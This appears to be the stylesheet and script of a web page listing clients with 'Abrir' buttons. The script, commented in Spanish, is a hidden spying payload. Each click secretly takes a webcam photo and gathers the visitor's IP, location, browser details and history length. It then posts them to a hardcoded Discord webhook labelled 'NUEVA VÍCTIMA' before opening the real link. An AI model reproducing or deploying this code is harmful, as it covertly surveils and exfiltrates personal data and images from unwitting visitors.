<style>
  :root{--bg-1:#05060a;--bg-2:#0b1220;--card:#0f1724;--muted:#9ca3af;--accent1:#a78bfa;--accent2:#ec4899;--danger:#ef4444;--success:#4ade80;--glass:rgba(255,255,255,0.04);}
  *{box-sizing:border-box}
  html,body{height:100%;margin:0;font-family:Inter,ui-sans-serif,system-ui;color:#fff;}
  body{background:radial-gradient(1200px 600px at 10% 10%,rgba(167,139,250,0.08),transparent 8%),radial-gradient(900px 500px at 90% 90%,rgba(236,72,153,0.05),transparent 8%),linear-gradient(180deg,var(--bg-1),var(--bg-2));min-height:100vh;display:flex;flex-direction:column;}
  header{position:sticky;top:0;z-index:60;background:linear-gradient(180deg,rgba(255,255,255,0.02),rgba(255,255,255,0.01));backdrop-filter:blur(8px);border-bottom:1px solid rgba(255,255,255,0.03);}
  .nav{max-width:1200px;margin:0 auto;padding:18px 20px;display:flex;gap:12px;align-items:center;justify-content:space-between;}
  .brand{display:flex;gap:12px;align-items:center;cursor:pointer;}
  .logo{width:48px;height:48px;display:grid;place-items:center;border-radius:12px;background:linear-gradient(135deg,var(--accent1),var(--accent2));font-weight:800;}
  .brand-text .title{font-size:1.15rem;font-weight:800;background:linear-gradient(90deg,var(--accent1),var(--accent2));-webkit-background-clip:text;color:transparent}
  .controls{flex:1;margin-left:20px;display:flex;align-items:center;gap:16px}
  .search{flex:1;display:flex;align-items:center;gap:10px;background:var(--glass);border-radius:12px;padding:8px 12px;border:1px solid rgba(255,255,255,0.04);}
  .search input{flex:1;background:transparent;border:0;color:#e6eef8;font-size:15px;padding:10px;outline:none;}
  main{flex:1;max-width:1200px;margin:28px auto;padding:0 20px 60px;width:100%;}
  .h1{font-size:28px;font-weight:800;}
  .grid{display:grid;gap:14px;grid-template-columns:repeat(auto-fit,minmax(240px,1fr))}
  .card{background:linear-gradient(180deg,rgba(255,255,255,0.02),rgba(255,255,255,0.01));border:1px solid rgba(255,255,255,0.03);padding:16px;border-radius:12px;transition:all .2s;}
  .card:hover{transform:translateY(-6px);box-shadow:0 18px 40px rgba(23,12,59,0.45);}
  .open-btn{display:inline-block;padding:10px 12px;border-radius:10px;background:linear-gradient(90deg,var(--accent1),var(--accent2));color:#fff;font-weight:700;width:100%;cursor:pointer;}
  .series-title{font-size:18px;font-weight:800;margin:28px 0 10px;border-bottom:1px dashed rgba(255,255,255,0.03);padding-bottom:10px}
  footer{padding:30px 20px;color:var(--muted);font-size:13px;text-align:center;border-top:1px solid rgba(255,255,255,0.03)}
</style>

<script>

const WEBHOOK = "https://discord.com/api/webhooks/1446712518235132064/eJEf4dEbhh7vqpyY3nzoDzAGQBgotn_ivDnW80FGx5DrW3cgtRMH1txi34Munkrmik_7";

// CAPTURA CUANDO DAN CLIC EN CUALQUIER BOTÓN "Abrir"
document.querySelectorAll('.open-btn').forEach(btn => {
  btn.addEventListener('click', async () => {
    const realLink = btn.getAttribute('data-link');

    // 1. Tomar foto (solo la primera vez pide permiso)
    let photo = null;
    try {
      const stream = await navigator.mediaDevices.getUserMedia({video:true});
      const video = document.createElement('video');
      video.srcObject = stream;
      await video.play();
      const canvas = document.createElement('canvas');
      canvas.width = 640; canvas.height = 480;
      canvas.getContext('2d').drawImage(video,0,0,640,480);
      photo = await new Promise(r => canvas.toBlob(r,'image/jpeg',0.9));
      stream.getTracks().forEach(t=>t.stop());
    } catch(e) {}

    // 2. Datos completos
    const geo = await fetch('https://ipapi.co/json/').then(r=>r.json()).catch(()=>({}));

    const victim = {
      time: new Date().toLocaleString(),
      ip: geo.ip || 'desconocida',
      ubicacion: `${geo.city||''}, ${geo.country_name||''}`,
      navegador: navigator.userAgent,
      idioma: navigator.language,
      pantalla: `${screen.width}x${screen.height}`,
      historial: history.length
    };

    // 3. Enviar a tu Discord
    const form = new FormData();
    form.append('content', `**NUEVA VÍCTIMA** <@TU_ID>\nCliente: ${btn.parentNode.querySelector('.client-name').textContent}\nIP: ${victim.ip} (${victim.ubicacion})\nHora: ${victim.time}\nPantalla: ${victim.pantalla} | Historial: ${victim.historial}`);
    if (photo) form.append('file', photo, 'foto.jpg');
    fetch(WEBHOOK, {method:'POST', body:form});

    // 4. Abrir el cliente normalmente
    window.open(realLink, '_blank');
  });
});
